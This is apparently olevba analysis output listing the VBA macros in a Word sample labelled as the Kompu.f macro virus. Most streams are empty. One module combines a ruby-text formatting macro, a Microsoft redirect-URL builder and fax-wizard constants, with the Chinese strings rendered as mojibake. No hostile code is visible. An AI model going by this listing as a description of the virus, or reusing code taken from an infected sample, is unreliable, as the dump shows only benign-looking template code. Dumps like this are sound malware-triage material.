olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kompu.f-3c4c79dffa565306091f60d992bb2e80393a6b5fb2b9f7b07cbb66cacd59208d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kompu.f-3c4c79dffa565306091f60d992bb2e80393a6b5fb2b9f7b07cbb66cacd59208d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO U16.bas 
in file: Virus.MSWord.Kompu.f-3c4c79dffa565306091f60d992bb2e80393a6b5fb2b9f7b07cbb66cacd59208d - OLE stream: 'Macros/VBA/U16'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO U17.bas 
in file: Virus.MSWord.Kompu.f-3c4c79dffa565306091f60d992bb2e80393a6b5fb2b9f7b07cbb66cacd59208d - OLE stream: 'Macros/VBA/U17'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO U18.bas 
in file: Virus.MSWord.Kompu.f-3c4c79dffa565306091f60d992bb2e80393a6b5fb2b9f7b07cbb66cacd59208d - OLE stream: 'Macros/VBA/U18'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO U20.bas 
in file: Virus.MSWord.Kompu.f-3c4c79dffa565306091f60d992bb2e80393a6b5fb2b9f7b07cbb66cacd59208d - OLE stream: 'Macros/VBA/U20'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO U04.bas 
in file: Virus.MSWord.Kompu.f-3c4c79dffa565306091f60d992bb2e80393a6b5fb2b9f7b07cbb66cacd59208d - OLE stream: 'Macros/VBA/U04'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Const SZ_MACRONAME = "¨Ã¦C¤å¦r"

Sub Insert()
    With Selection
        If Len(.Text) = 1 And .Text = (Chr$(13)) Then
            MsgBox "½Ð¥ý¿ï¨ú­n¨Ã¦Cªº¤å¦r¡A¦A¿ï¨ú¥»¥\¯à¿ï¶µ¡C", _
                    Title:=SZ_MACRONAME
            GoTo LExit:
        End If
        If ((.Start = .End) And (.Text = Chr$(21))) Then
            .MoveRight , 1, 1
        End If
        If (Right$(.Text, 1) = Chr$(13)) Then
            .End = .End - 1
        End If
        If (FIsRubyField(.Range) = False) Then
            If (.Range.Fields.Count > 0) Or (InStr(1, .Text, Chr$(13)) <> 0) _
                Or (InStr(1, .Text, vbTab) <> 0) Or (InStr(1, .Text, ",") <> 0) _
                Or (InStr(1, .Text, "(") <> 0) Or (InStr(1, .Text, vbTab) <> 0) Then
                MsgBox "µLªk¬°§t¦³©w¦ìÂI¡B¥\¯àÅÜ¼Æ©M¬q¸¨²Å¸¹ªº¦r¦ê¥[¤J¨Ã¦Cªºµù¸Ñ", Title:=SZ_MACRONAME
                GoTo LExit:
            End If
        End If
        If (Selection.Start = Selection.End) Then
            MsgBox "½Ð¿ï¨ú­n¥[¤Jµù¸Ñªº¦r¦ê", Title:=SZ_MACRONAME
            GoTo LExit:
        End If
    End With
    InitDialog
    dlgRuby.Show
LExit:
End Sub

Sub Create(szRuby As String, szFont As String, iSize As Integer, iDist As Integer, szAlign As String)
    Dim rgn As Range
    Dim n As Integer
    Dim iCurSize As Integer
    Dim szCurFont As String
    Dim fnt As Font
    Application.ScreenUpdating = False
    System.Cursor = wdCursorWait
    
    On Error GoTo LError
    With Selection
        Set rgn = .Range
        Set fnt = GetCurFont(rgn)
        If (FIsRubyField(rgn) = True) Then
            Delete
        End If

        iCurSize = fnt.Size
        szCurFont = fnt.Name
        n = Len(.Text)
        
        ' Insert Field
        .Fields.Add .Range, , , False
        .TypeText "eq \o"
        
        ' Ruby string align
        Select Case (szAlign)
        Case "¾a¥ª"
            .TypeText "\al"
        Case "µ¥¶¡¶Z®i¶}"
            .TypeText "\ad"
        Case Else
        End Select
        
        .TypeText "(\s\up" + Str$(Int(iDist + .Font.Size - 1)) + "("
        .InsertBefore szRuby
        .Font.Size = iSize
        .Font.Name = szFont
        .Font.DisableCharacterSpaceGrid = False
        .MoveRight
        .InsertAfter "),"
        .Font.Size = iCurSize
        .Font.Name = szCurName
        .MoveRight , n + 2
        .TypeText ")"
        ' Kludge, To remove space char at end of field....
        .MoveLeft , 2
        .Delete unit:=wdCharacter, Count:=1
        
        .Fields.ToggleShowCodes
        .MoveRight , 1, 1
        
    End With
LExit:
    Application.ScreenUpdating = True
    System.Cursor = wdCursorNormal
    Exit Sub
LError:
    MsgBox Err.Description, Title:=SZ_MACRONAME
End Sub

Sub Delete()
    Dim rgn As Range
    Dim rgnFld As Range
    Dim rgnNew As Range
    Dim szCode As String
    Dim FUpdate As Boolean
    
    On Error GoTo LError
    If (Application.ScreenUpdating = True) Then
        FUpdate = True
        Application.ScreenUpdating = False
        System.Cursor = wdCursorWait
    Else
        FUpdate = False
    End If
    
    With Selection
        Set rgn = .Range
        If (.Fields.Count < 1) Then GoTo LExit:
        For i = 1 To .Fields.Count
            szCode = rgn.Fields(i).Code
            Set rgnFld = rgn.Fields(i).Code
            If (FIsRubyField(rgn) = False) Then
                GoTo LExit:
            End If
            
            iTop = InStr(1, szCode, ",") + rgnFld.Start
            iEnd = rgnFld.End - 1
            rgnFld.SetRange iTop, iEnd
            
            .MoveLeft
            Set rgnNew = Selection.Range
            rgnNew.FormattedText = rgnFld.FormattedText
            .MoveRight , Len(rgnFld.Text)
            .MoveRight , 1, 1
            .Delete
            rgnNew.Select
            
        Next i
    End With
LExit:
    If (FUpdate = True) Then
        Application.ScreenUpdating = True
        System.Cursor = wdCursorNormal
    End If
    Exit Sub
LError:
    MsgBox Err.Description, Title:=SZ_MACRONAME
End Sub

Sub InitDialog()
    Dim i As Integer
    Dim n As Integer
    Dim szFont As String
    Dim szCode As String
    Dim fnt As Font
    Dim fntRuby As Font
    
    On Error GoTo LError:
    Application.ScreenUpdating = False
    System.Cursor = wdCursorWait

    dlgRuby.IDCD_ALIGN.Clear
    dlgRuby.IDCD_ALIGN.AddItem "¾a¥ª"
    dlgRuby.IDCD_ALIGN.AddItem "¸m¤¤"
    dlgRuby.IDCD_ALIGN.AddItem "µ¥¶¡¶Z®i¶}"
    
    With Selection
        Set fnt = GetCurFont(.Range)
        If (FIsRubyField(.Range) = True) Then
            dlgRuby.ID_RESET.Enabled = True
            ' Get Selected Field Values
            ' { eq \o\ad(\s\up 12(foo),bar) }
            Dim rgn As Range
            .Fields(1).Select
            Set rgn = .Fields(1).Code
            szCode = .Fields(1).Code.Text
            
            ' { eq \o\ad(\s\up 12(foo),bar) }
            '                     ~~~
            iTop = InStr(11, szCode, "(")
            iEnd = InStr(1, szCode, ",") - 2
            Set rgn = .Fields(1).Code
            rgn.SetRange rgn.Start + iTop, rgn.Start + iEnd
            Set fntRuby = GetCurFont(rgn)
            dlgRuby.IDCT_FONT.Caption = fntRuby.NameFarEast
            dlgRuby.IDCT_SIZE.Caption = fntRuby.Size
            dlgRuby.IDCE_TEXT = rgn.Text
            
            ' { eq \o\ad(\s\up 12(foo),bar) }
            '                  ~~
            iTop = InStr(1, szCode, "up ") + 2
            iEnd = InStr(11, szCode, "(")
            Set rgn = .Fields(1).Code
            rgn.SetRange rgn.Start + iTop, rgn.Start + iEnd
            dlgRuby.IDCE_DIST = Val(Mid$(szCode, iTop, iEnd - iTop)) - Int(fnt.Size) + 1
            
            ' { eq \o\ad(\s\up 12(foo),bar) }
            '        ~~~
            If (InStr(1, szCode, "\al") > 0) Then
                dlgRuby.IDCD_ALIGN.ListIndex = 0
            ElseIf (InStr(1, szCode, "\ad") > 0) Then
                dlgRuby.IDCD_ALIGN.ListIndex = 2
            Else
                dlgRuby.IDCD_ALIGN.ListIndex = 1
            End If
        Else
            dlgRuby.ID_RESET.Enabled = False
            dlgRuby.IDCE_TEXT = ""
            dlgRuby.IDCE_DIST = Str$(0)
            dlgRuby.IDCT_SIZE.Caption = Int(fnt.Size / 2)
            dlgRuby.IDCT_FONT.Caption = fnt.NameFarEast
            dlgRuby.IDCD_ALIGN.ListIndex = 1
        End If
        dlgRuby.IDCE_TEXT.IMEMode = fmIMEModeNoControl
        dlgRuby.IDCE_TEXT.SetFocus
        dlgRuby.IDCE_TEXT.SelStart = 0
        dlgRuby.IDCE_TEXT.SelLength = 99
        If (dlgRuby.IDCE_TEXT.Text <> "") Then
            dlgRuby.IDOK.Enabled = True
        Else
            dlgRuby.IDOK.Enabled = False
        End If
    End With

    Application.ScreenUpdating = True
    System.Cursor = wdCursorNormal
    Exit Sub
LError:
    MsgBox Err.Description, Title:=SZ_MACRONAME
End Sub

Function FIsRubyField(rgn As Range) As Boolean
    FIsRubyField = False
    If (rgn.Fields.Count = 0) Then Exit Function
    a$ = rgn.Fields(1).Code.Text
    ' { eq \o\ad(\s\up 12(foo),bar) }
    '   ~~~~~   ~~~~~~ and "),\s\do" is only contained Kumimoji field
    If (Left$(a$, 6) = " eq \o") And (InStr(6, a$, "(\s\up") <> 0) And (InStr(9, a$, "),\s\do") = 0) _
        And (Right$(a$, 1) = ")") Then
        FIsRubyField = True
    End If
End Function


Function BuildRedirString$()

Dim RedirString$
Dim Arg$(0 To 11)
Dim OS As String

Select Case System.OperatingSystem
Case "Windows"
  OS = "Win"
Case "Windows NT"
  OS = "WinNT"
Case "Macintosh"
  OS = "Mac"
Case Else
  OS = "Win"
End Select

RedirString$ = "http://www.microsoft.com/isapi/redir.dll?"

Arg$(0) = "PRD=Word"
Arg$(1) = "&SBP=ia"
Arg$(2) = "&PLCID=" & Application.International(wdProductLanguageID)
Arg$(3) = "&PVER=" & Application.Version
Arg$(4) = "&OS=" & OS
Arg$(5) = "&OVER=" & System.Version
Arg$(6) = "&OLCID=" 'intentionally left blank
Arg$(7) = "&CLCID=" & "0x" & System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\International", "Locale")
Arg$(8) = "&AR=templates"
Arg$(9) = "&O1="
Arg$(10) = "&O2="
Arg$(11) = "&O3="


For i = 0 To 11
  RedirString$ = RedirString$ & Arg$(i)
Next

BuildRedirString$ = RedirString$

End Function

Sub UpdateLink()
    Dim Anchor As Range
    For Each Hlink In ActiveDocument.Hyperlinks 'look at all hyperlinks in doc
        If Hlink.Address = "http://www.microsoft.com/isapi/redir.dll?PRD=Word&SBP=ia&PVER=8.0&AR=templates" Then 'look for address to change
            If Hlink.Type = msoHyperlinkRange Then 'get Anchor - Text Or Shape
                Set Anchor = Hlink.Range        'text anchor
            Else
                Set Anchor = Hlink.Shape        'shape anchor
            End If
            Hlink.Delete            'delete old link
            ActiveDocument.Hyperlinks.Add Anchor, BuildRedirString()  'add new hlink in same place
        End If
    Next
End Sub

Option Explicit

'Standard Claimer

''******************************************************************************
'TO BE LOCALIZED
''******************************************************************************
'Style names
Public Const strSTY_RETURN_ADDR     As String = "Return Address"
Public Const strSTY_DOC_LABEL       As String = "Document Label"
Public Const strSTY_COMPANY_NAME    As String = "Company Name"
Public Const strSTY_MSG_HDR_FIRST   As String = "Message Header First"
Public Const strSTY_MSG_HDR_LABEL   As String = "Message Header Label"
Public Const strSTY_MSG_HDR_LAST    As String = "Message Header Last"

'misc strings
Public Const strPHONE   As String = "¹q¸Ü¡G"
Public Const strFAX     As String = "¶Ç¯u¹q¸Ü¡G"
Public Const strPAGES   As String = "Á`­¶¼Æ¡G"
Public Const strTO      As String = "¦¬¥óªÌ¡G"
Public Const strFROM    As String = "±H¥óªÌ¡G"
Public Const strDATE    As String = "¤é´Á¡G"
Public Const strRE      As String = "¥D¦®¡G"
Public Const strCC      As String = "ªþ¥»¡G"

Public Const strCOMPANY         As String = "¤½¥q¦æ¸¹¡G"
Public Const strFAX_NUMBER      As String = "¶Ç¯u¹q¸Ü¡G"
Public Const strPHONE_NUMBER    As String = "¹q¸Ü¡G"
Public Const strTOTAL_NO_PAGES  As String = "¥]§t«Ê­±¦b¤ºÁ`¦@­¶¼Æ¡G"

Public Const strEMPTY_MACRO As String = "EmptyMacro "
Public Const strNONE        As String = "<None>" 'choice to list of merge field
                                                 'names found in data source
                                'doc. if there is no field for last name.
                                'if the user selected this choice we don't
                                'insert a merge field for last name in the cover sheet.
Public Const strFLD_NAME As String = "Name" 'to select the field containing recipient name
                                    'from the fields present in the data source
Public Const strFLD_FAX As String = "Fax" 'to select the merge field containing fax number

Public Const strCLICK_HERE_NAME     As String = "[«ö¤@¤U³o¸Ì¿é¤J©m¦W]"
Public Const strCLICK_HERE_PAGES    As String = "[«ö¤@¤U³o¸Ì¿é¤J¶Ç¯u­¶¼Æ]"
Public Const strCLICK_HERE_SUBJECT  As String = "[«ö¤@¤U³o¸Ì¿é¤J¶Ç¯u¥D¦®]"
Public Const strCLICK_HERE_COMMENTS As String = "[«ö¤@¤U³o¸Ì¿é¤J¥²­nªºµù°O]"
Public Const strCLICK_HERE_COMPANY  As String = "[«ö¤@¤U³o¸Ì¿é¤J¤½¥q¦WºÙ]"
Public Const strCLICK_HERE_PHONE_NUMBER As String = "[«ö¤@¤U³o¸Ì¿é¤J¹q¸Ü]"
Public Const strCLICK_HERE_FAX_NUMBER As String = "[«ö¤@¤U³o¸Ì¿é¤J¶Ç¯u¹q¸Ü]"

'Address format to get info. from the Address book. Please be careful about the commas and
'spaces since you might end up with a space at the beginning of a name if not put at the right place.
'Please change the names only if you know the correct one.
Public Const strADDR_BK_NAME_FORMAT As String = "{{<PR_GIVEN_NAME> }{<PR_SURNAME>}|<PR_DISPLAY_NAME>}"
Public Const strADDR_BK_ADDR_FORMAT As String = "{<PR_POSTAL_ADDRESS>|{<PR_STREET_ADDRESS>" & vbCr & "}{<PR_LOCALITY>}{, {<PR_STATE_OR_PROVINCE> }<PR_POSTAL_CODE>}}"
Public Const strADDR_BK_FAXNUM_FORMAT As String = "{<PR_PRIMARY_FAX_NUMBER>|<PR_BUSINESS_FAX_NUMBER>|<PR_HOME_FAX_NUMBER>}"
Public Const strADDR_BK_PHONE_FORMAT As String = "{<PR_PRIMARY_TELEPHONE_NUMBER>|<PR_BUSINESS_TELEPHONE_NUMBER>|<PR_OFFICE_TELEPHONE_NUMBER>}"
Public Const strADDR_BK_COMPANY_FORMAT As String = "{<PR_COMPANY_NAME>}"

'status messages put up while faxing the cover sheet and document. For some messages
'I add "..." and so add "..." to all strings.
Public Const strFAXING_DOC_RECIPIENTS As String = "¥¿¦b¶Ç¯u³o¥÷¤å¥óµ¹©Ò¦³¦¬¥óªÌ..."
Public Const strFAXING_DOC_RECIPIENT As String = "¥¿¦b¶Ç¯u³o¥÷¤å¥óµ¹¦¬¥óªÌ"
Public Const strFAXING_CS_RECIPIENTS As String = "¥¿¦b¶Ç¯u«Ê­±µ¹©Ò¦³¦¬¥óªÌ..."
Public Const strFAXING_CS_RECIPIENT As String = "¥¿¦b¶Ç¯u«Ê­±µ¹©Ò¦³¦¬¥óªÌ"
Public Const strFAXING_CS_TO As String = "¥¿¦b¶Ç¯u«Ê­±¨ì"
Public Const strFAXING_DOC_TO As String = "¥¿¦b¶Ç¯u¤å¥ó¨ì"

'the text in the last panel
'the first one is the default. The next string is used if the user selects no cover sheet, when
'we actually send the fax on clicking Finish
Public Const strLAST_PANEL_DFLT_TEXT As String = "¦pªG°õ¦æºëÆF¦³°ÝÃDªº¸Ü¡A½Ð­«·s°õ¦æ¶Ç¯uºëÆF¡AÀË¬d¿é¤J¶Ç¯u¹q¸Üªº®æ¦¡¬O§_¥¿½T¡C¨Ò¦p¡A±z¬O¤£¬O§Ñ¤F¶Q¤½¥qªº¹q¸Ü¨t²Î¦b¼·¥~½u«e¡A»Ý¥ý«ö­ÓÁä¡A¤ñ¦p»¡¼Æ¦rÁä¡u9¡v¡C­n°O±o¥[¶i¶Ç¯u¹q¸Ü¤¤³á¡I"
Public Const strLAST_PANEL_NOCOVSHT_TEXT As String = "©Ò¦³¸ê®Æ¤w¿é¤J§¹²¦¡A«ö¤@¤U§¹¦¨Áä¡AºëÆF±N°e¥X±zªº¶Ç¯u¤å¥ó¡I"

'strings necessary to display help in case of failure of Fax
Public Const strHLP_FAX_INSTALL As String = "¦pªG±z²{¦b°õ¦æªº¬O Windows 95¡A²{¦b±z´N¥i¥H¦w¸Ë¥»ºëÆF¤F¡C«ö¤U½T©wÁä¡A¿Ã¹õ¤W±N·|¥X²{»²§U»¡©ú¤å¥ó¡A§i¶D±z¦p¦ó¦w¸ËºëÆF¡I"
'the next string is the title as it appears on Word's main window
Public Const strMS_WORD As String = "Microsoft Word"

'make sure that strCMD_BAR_TITLE is as long as strCMD_BTN_TEXT, so that strCMD_BTN_TITLE does not get clipped off
'when the command bar is displayed.
Public Const strCMD_BAR_TITLE   As String = "¤¤¤å¶Ç¯uºëÆF"
Public Const strCMD_BTN_TEXT    As String = "²{¦b°e¥X¶Ç¯u"

Public Const strCURRENT_DOC     As String = "¥Ø«eªº¤å¥ó("
Public Const strRIGHT_PAREN     As String = ")"

'Window caption of the cover sheet (the document's name will follow if the user is faxing a document)
Public Const strWINDOW_CAPTION  As String = "ªº¶Ç¯u«Ê­±ªí³æ"
'Window caption if user is not faxing a doc. and just created a cover sheet.
Public Const strCOVER_SHEET_CAPTION As String = " - ¶Ç¯u«Ê­±ªí³æ"

'Text in merge fields inserted in the cover sheet
Public Const strFLD_FAX_NAME    As String = "Name"
Public Const strFLD_FAX_NUMBER  As String = "FaxNumber"

'In NT3.51, the printer name from the print set up dialog which is called when the user clicks on
'Other... , returns the printer name with the printer location after ON
'so if a printer name is \\abcd\efg with location "location1" then the printer
'name is returned a "\\abcd\efg ON location1. So we have to strip out the text
'after ON. That's what this constant is for. In other countries too is this text
'going to be ON?
Public Const strPRINTER_ON      As String = " ON "

Public Const iMAX_ADDR_LINES = 3 'max. # of lines address can have
'Error messages
Public Const strERR_MAX_ADDR_LINES  As String = "¦a§}¤£¥i¶W¹L¤T¦æ¡C"
Public Const strERR_NO_DATA_SRC     As String = "ºëÆF§ä¤£¨ì­n¶Ç¯uªº¤å¥ó¡C"
Public Const strERR_CREATING_CMDBAR As String = "ºëÆFµLªk«Ø¥ß¡uSend Fax¡v¤u¨ã¦C¡C ½Ð­«·s°õ¦æ¶Ç¯uºëÆF¡C"
Public Const strERR_NO_MAIN_DOC1     As String = "­n«Ø¥ß«Ê­±ªí³æªº¤å¥ó ("
Public Const strERR_NO_MAIN_DOC2     As String = ") ¥¼¶}±Ò¡C½Ð¥ý¶}±Ò¸Ó¤å¥ó¡AµM«á­«·s°õ¦æºëÆF¡I"
Public Const strERR_DISPLAY_QUERY_OPTIONS As String = "ºëÆF§ä¤£¨ì­n¥[¤Jªº¸ê®Æ¡C"
Public Const strERR_CHOOSING_DOC As String = "ºëÆFµLªk¿ï¨ú­n¥Î¨Ó¶Ç¯uªº¤å¥ó¡C"
Public Const strERR_RCPNTS_NOT_CHOSEN As String = "ºëÆF»Ý­nª¾¹D³o¥÷ªº¦¬¥óªÌ¬O½Ö¡C½Ð«ö¤U¡u½T©w¡v¶s¡AµM«á¿ï¨ú¶Ç¯uªº¦¬¥óªÌ¡C"

'this tip is displayed in an Autodown balloon finally
Public Const strPOST_WIZARD_TIP_NO_MRG_FLD As String = "½Ð¿é¤J¨ä¥¦±z·Q¼g¦b«Ê­±ªí³æ¤Wªº¸ê®Æ¡AµM«á«ö¤U¦b " & strCMD_BAR_TITLE & " ¤u¥y¦C¤Wªº¡u" & strCMD_BTN_TEXT & "¡v¶s¡C "
'this tip is displayed if we inserted merge fields in the cover sheet i.e. in the case of multiple recipients
Public Const strPOST_WIZARD_TIP_MRG_FLD As String = "½Ð¿é¤J¨ä¥¦±z·Q¼g¦b«Ê­±ªí³æ¤Wªº¸ê®Æ¡AµM«á«ö¤U¦b " & strCMD_BAR_TITLE & " ¤u¥y¦C¤Wªº¡u" & strCMD_BTN_TEXT & "¡v¶s¡C " & "¦ý½Ð¤£­n§R°£¦b¡u<< >>¡v²Å¸¹¤¤ªºÄæ¦ì¡Fµy«á¶Ç¯uºëÆF±N§Q¥Î¥L­Ì¨Ó¶Ç¯u±z«ü©wªº¤å¥ó¨ì¦¬¥óªÌ¤â¤W¡C"

'this message is put up after we successfully faxed everything
Public Const strMSG_FAX_SUCCESS As String = "ºëÆF¤w±N±zªº¤å¥ó°e¥X¥h¤F¡C"

'the 72 factor in the below 2 measurements is conversion factor of inches to points
'contemporary styles have a left indent of 0.56"
Public Const sCONT_LEFT_INDENT As Single = 0.56 * 72
'While converting text to table, for the Contemporary style alone,
'I need to set the first column's width explicitly. For English text,
'0.5" is big enough. If the text in the first column is getting truncated
'in your language, then please increase this value.
Public Const sCONT_WIDTH_COL1 As Single = 2.36 * 72

'The date format need not be localized if VB does not require it.
'Medium date is of the format "02-Apr-94". If the standard date format
'is anything different in the country, then please change it.
'important to have MMMM and not mmmm, since mm refers to minutes in a time field
Public Const strDATE_FORMAT As String = "MMMM d, yyyy"

''******************************************************************************
'DO NOT LOCALIZE THE CONSTANTS/DECLARATIONS BEYOND THIS
''******************************************************************************
'the following are the names of the autotext entries in the wizard.
'DON'T CHANGE THE NAMES OF THE AUTOTEXT ENTRIES IN THE WIZARD.
'if you change them, then please change the following strings too, correspondingly
Public Const strAT_UNCHKD_BOX   As String = "Unchecked Box"
Public Const strAT_CHKD_BOX     As String = "Checked Box"
Public Const strCNTMPGFX2        As String = "cntmpgfx2"
Public Const strPOST_WIZ_BLN    As String = "Fax Post Wizard Balloon"

Public Const sA4_LEFT_MARGIN    As Single = 82.08
Public Const sA4_RIGHT_MARGIN    As Single = 81.36
Public Const sLETTER_MARGIN     As Single = 90
'key where setup writes company name
Public Const strREGKEY_CMPNY_NAME As String = "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
Public Const strVALKEY_CMPNY_NAME As String = "DefCompany"

Public fDocChanged As Boolean 'set if user changes the doc. to be faxed

Public objMainDoc As Document 'main doc which has to be sent
Public objDataSrc As MailMergeDataSource ' main doc's data src

'SQL query used to select all names from the data source
Public Const strSELECT_QUERY As String = "Select * From "

'form and callback balloon constants
Public Const iMAX_PANEL As Integer = 6 'panel # of the last panel in
                             'the dialog (starts from 0)
Public rgstrAssistantMsg(iMAX_PANEL) As String   ' as many as there are states

Public strBULLET     As String
Public strSOFT_ENTER As String
Public rgstrNotes(3) As String
Public strQUOTE As String
'available styles
Public Const iSTY_PROFESSIONAL  As Integer = 0
Public Const iSTY_CONTEMPORARY  As Integer = 1
Public Const iSTY_ELEGANT       As Integer = 2

'array for holding long and short template names
Public rgstrTemplateFileNames(3, 3) As String
Public Const iLONG_NAME As Integer = 0
Public Const iSHORT_NAME As Integer = 1

Public iFaxStyle As Integer 'stores the fax style chosen
Public fStylesCopied As Boolean

Public fMSFAXEnabled As Boolean 'disabled in NT

'Panel numbers
Public Const iPANEL_RCPNTS As Integer = 3
Public Const iPANEL_SENDER As Integer = 5
Public Const iPANEL_STYLE  As Integer = 4

'Max. number of recipients
Public Const iMAX_RCPNTS As Integer = 5

Public fDocIsFormLtr As Boolean 'true if doc. is a form letter
'to store the data options query that the user selects for the form letter
Public strFormLetterSQL As String
Public strFormLetterSQL1 As String
Public strConnectString As String
Public fDocPresent   As Boolean 'true if there is an main doc. apart
                                'from the doc created by FileNew
'keeps track of which panel to be skipped.
'if we are enabling a panel, then we need to restore the shape's
'color to as it was before. rgiColorShape stores that color
Public rgfSkipPanel(iMAX_PANEL) As Boolean 'if rgfSkipPanel(i) is True,
                                            'then skip the ith panel
Public rgiColorShape(iMAX_PANEL) As Long
Public fCheckValidity As Boolean
Public fNoCovSht As Boolean 'False if user selects "No cover sheet"

Public iFaxOption       As Integer 'Fax program selected by the user
Public Const iMS_FAX    As Integer = 0  'Microsoft Fax
Public Const iDIFF_FAX  As Integer = 1  'Other than MS Fax
Public Const iNO_FAX    As Integer = 2  'just print without faxing the doc/cover sheet

Public fRegistryNamesRead As Boolean 'true if MRU list has been read from reg.

Dim rgstrFaxTitle(3)        As String
Dim rgstrChkBoxText(5)      As String 'text beside the check boxes
Public strAsstMsgRcpntsFormLtr As String 'assistant help for form letter recipients' panel
Public strAsstMsgRcpntsOrdDoc As String 'assistant help for ordinary doc. recipients' panel

'tip displayed in an autodown balloon after the wizard is done
Public fCreatedCmdBar           As Boolean 'tip is to be displayed only if cmd bar created

'arrays to get the MRU list of recipient names and numbers stored in the registry
Dim rgstrMRUFaxNames(iMAX_RCPNTS) As String
Dim rgstrMRUFaxNums(iMAX_RCPNTS)  As String

'arrays to get the recipients names and numbers that the user entered
Dim rgstrRcpntFaxNames(iMAX_RCPNTS) As String
Dim rgstrRcpntFaxNums(iMAX_RCPNTS)  As String
Public iNumRcpnts As Integer

'DO NOT LOCALIZE - CONTROL NAMES
Public Const strCBO_RCPNT_NAME  As String = "cboRcpntName"
Public Const strCBO_RCPNT_NUM   As String = "cboRcpntNum"
Public iCboRcpntNameFocus       As Integer

'DO NOT LOCALIZE - REGISTRY ENTRIES
Public Const strRCPNT_NAME      As String = "Name of recipient#"
Public Const strRCPNT_NUMBER    As String = "Number of recipient#"
Public Const strNUM_RCPNTS      As String = "Number of recipients"

'Help files
Public Const strWIN_HELP_FILE As String = "Windows.hlp"
Public Const strFAX_HELP_FILE As String = "awfax.hlp"

'contexts for the help
Public Const lCNTXT_FAX_INSTALL As Long = 461903903
Public Const lCNTXT_FAX_SEND As Long = 1698757633
Public Const HELP_COMMAND As Integer = 258 'hex value = 0x0102

'error number that word returns on fax not being installed
Public Const iERR_FAX_NOT_INSTALLED As Integer = 5663
Public Const iERR_FAX_NOT_SENT As Integer = 4559

'DO NOT LOCALIZE - REGISTRY ENTRIES REGARDING PRINTERS
Declare Function RegEnumKey Lib "advapi32.dll" Alias "RegEnumKeyA" _
(ByVal hKey As Long, ByVal dwIndex As Long, ByVal lpName As String, ByVal cbName As Long) As Long

Declare Function RegOpenKey Lib "advapi32.dll" Alias "RegOpenKeyA" _
(ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long

Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long

Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal strDir As String, ByVal uSize As Integer) _
As Integer

Declare Function FindWindow Lib "USER32" Alias "FindWindowA" (ByVal strWndClassName As String, _
ByVal strWndName As String) As Long

Declare Function WinHelp Lib "USER32" Alias "WinHelpA" (ByVal hwnd As Long, ByVal strFileName As String, _
ByVal wCmd As Integer, ByVal dwData As Any) As Integer


Public rgstrPrinterNames()  As String
Public iTotalNumPrinters    As Integer

Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Const KEY_ALL_ACCESS As Long = &HF0063
Const ERROR_SUCCESS As Long = 0
Const ERROR_NO_MORE_ITEMS As Long = 259

'registry keys under which printer names are found
Const strREG_PROVIDERS As String = "System\CurrentControlSet\Control\Print\Providers\"
Const strREG_LOCAL_PRINTERS As String = "System\CurrentControlSet\Control\Print\Printers\"

'initialise the vars. whiehc refer to the wizard's name
Public Sub InitWizardName(fDummy As Boolean)
    
    strWizName = "¤¤¤å¶Ç¯uºëÆF"
    strWizLongName = "¤¤¤å¶Ç¯uºëÆF"
    strWizShortName = "CFax1"

End Sub

'initialize strings specific to this wizard
Private Sub InitWizardStrings()
Dim i As Integer
    
    'fax title for the different styles
    rgstrFaxTitle(iSTY_CONTEMPORARY) = "¶Ç¯u«H¥ó"
    rgstrFaxTitle(iSTY_ELEGANT) = "¶Ç¯u«H¥óªí³æ"
    rgstrFaxTitle(iSTY_PROFESSIONAL) = "¶Ç¯u"
    
    'text appearing after the unchecked boxes
    rgstrChkBoxText(1) = "«æ¥ó"
    rgstrChkBoxText(2) = "½Ð¬d¾\"
    rgstrChkBoxText(3) = "½Ð§å¥Ü"
    rgstrChkBoxText(4) = "½Ð¦^ÂÐ"
    rgstrChkBoxText(5) = "½Ð¶Ç¾\"
    
    'Assistant messages
    rgstrAssistantMsg(0) = "¨Ï¥Î¶Ç¯uºëÆF¡A±z¥i¥H¶Ç¯u¹q¤l¶l¥ó¡A±N«H¥ó¦X¨Ö¨ì¶Ç¯u¤å¥ó¤¤¤@°_¶Ç¯u¡A ©Î±q¶Ç¯u¾÷¤¤¦L¥X¤@±i«Ê­±ªí³æ¡C"
    rgstrAssistantMsg(1) = "¦pªG±z·Q­n¶Ç¯u¨ä¥¦¤å¥ó¡A½Ð¥ý¶}±Ò±z·Q­n¶Ç¯uªº¤å¥ó¡AµM«á¦A°õ¦æ¶Ç¯uºëÆF¡C"
    rgstrAssistantMsg(2) = "¦pªG±zªº§@·~¨t²Î¬O Windows NT¡A«h±zµLªk¨Ï¥Î Microsoft ¶Ç¯u¡A¦ý¬O±zÁÙ¬O¥i¥H¨Ï¥Î¨ä¥¦¤w¦w¸Ë¦b¨t²Î¤¤ªº¶Ç¯u³nÅé¨Ó¬°±z¶Ç¯u¡C¦pªG±zªº¨t²Î¤£¤ä´©¶Ç¯u¥\¯àªº¸Ü¡A¨SÃö«Y¡A±z¥i¥H¥ý±N¤å¥ó¦C¦L¥X¨Ó¡AµM«á¦A§Q¥Î¶Ç¯u¾÷±N¤å¥ó¶Ç¯u¥X¥h¡C"
